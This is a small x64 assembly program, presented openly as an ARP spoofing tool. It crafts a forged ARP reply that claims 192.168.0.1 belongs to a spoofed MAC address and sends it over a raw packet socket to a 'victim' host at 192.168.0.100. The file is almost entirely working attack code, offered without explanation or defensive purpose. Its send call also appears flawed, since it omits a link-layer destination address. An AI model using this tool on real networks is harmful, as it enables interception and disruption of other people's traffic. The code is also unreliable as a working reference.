; edelweiss.asm - x64 ARP spoofing tool  
; Assemble: nasm -f elf64 edelweiss.asm -o edelweiss.o
; Ath:      hwollwage
; Run:      sudo ./edelweiss

BITS 64
GLOBAL _start

SECTION .data

eth_hdr:        ; Ethernet header
    db 0xff,0xff,0xff,0xff,0xff,0xff    ; Destination MAC
    db 0xde,0xad,0xbe,0xef,0xde,0xad    ; Source MAC (spoofed)
    dw 0x0608                           ; EtherType = ARP (0x0806 LE)

arp_pkt:        ; ARP packet (28 bytes)
    dw 0x0100         ; Hardware type (Ethernet)
    dw 0x0008         ; Protocol type (IPv4)
    db 6              ; Hardware size
    db 4              ; Protocol size
    dw 0x0200         ; Opcode: reply
    db 0xde,0xad,0xbe,0xef,0xde,0xad    ; Sender MAC (spoofed)
    db 192,168,0,1                     ; Sender IP
    db 0xaa,0xbb,0xcc,0xdd,0xee,0xff    ; Target MAC (victim)
    db 192,168,0,100                   ; Target IP

SECTION .bss
sock_fd resq 1

SECTION .text

_start:

    ; socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)
    mov rax, 41
    mov rdi, 17
    mov rsi, 3
    mov rdx, 0x0300
    syscall
    mov [sock_fd], rax

    ; Send packet
    mov rsi, eth_hdr
    mov rdx, 42
    mov rdi, [sock_fd]
    mov rax, 44
    xor r10, r10
    xor r8, r8
    syscall

    ; Exit
    mov rax, 60
    xor rdi, rdi
    syscall